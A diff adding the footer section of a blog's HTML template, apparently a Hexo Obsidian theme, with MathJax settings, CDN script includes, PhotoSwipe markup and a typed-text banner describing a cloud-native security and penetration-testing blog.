+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+ 
+<link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
+ 
+<script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>
+  
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/obsidian.js"></script>
+<script src="/js/jquery.truncate.js"></script>
+<script src="/js/search.js"></script>
+ 
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+ 
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+ 
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+ 
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/java/java.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/go/go.min.js"></script>
+   
+<script src="/js/busuanzi.min.js"></script>
+
+<script>
+  $(document).ready(function () {
+    if ($('span[id^="busuanzi_"]').length) {
+      initialBusuanzi();
+    }
+  });
+</script>
+ 
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+
+
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+  
+
+<script>
+  function initialTyped() {
+    var typedTextEl = $('.typed-text');
+    if (typedTextEl && typedTextEl.length > 0) {
+      var typed = new Typed('.typed-text', {
+        strings: ['致力于云原生安全和自动化渗透测试的研究与分享', '艺术家思维去思考问题，工匠创造精神去开发|'],
+        typeSpeed: 90,
+        loop: true,
+        loopCount: Infinity,
+        backSpeed: 20,
+      });
+    }
+  }
+
+  if ($('.article-header') && $('.article-header').length) {
+    $(document).ready(function () {
+      initialTyped();
+    });
+  }
+</script>
+
+
+
+
+<!-- 引用依赖 -->
+<script>document.write(aplayerconf)</script>
+
+
+
+
+</html>
